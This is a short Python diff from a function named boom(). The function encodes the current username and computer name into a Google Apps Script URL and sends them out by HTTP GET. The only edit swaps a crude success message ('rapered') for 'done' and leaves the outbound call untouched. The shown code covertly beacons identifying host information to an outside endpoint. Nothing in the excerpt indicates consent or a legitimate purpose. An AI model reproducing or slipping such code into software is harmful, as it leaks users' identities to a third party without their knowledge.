@@ -16,7 +16,7 @@ def boom():
     fullURL = f"https://script.google.com/macros/s/AKfycbys_0dn2UPA4fXqNgqqYIHnUxoDUIusA8BoIVSghSJ8BR7colxlDEYLhqvv4OVCE6Is/exec?username={encodedUser}&computer={encodedPC}"
     response = requests.get(fullURL)
     if response.status_code == 200:
-        print("rapered", response.text)
+        print("done", response.text)
     else:
       pass
 
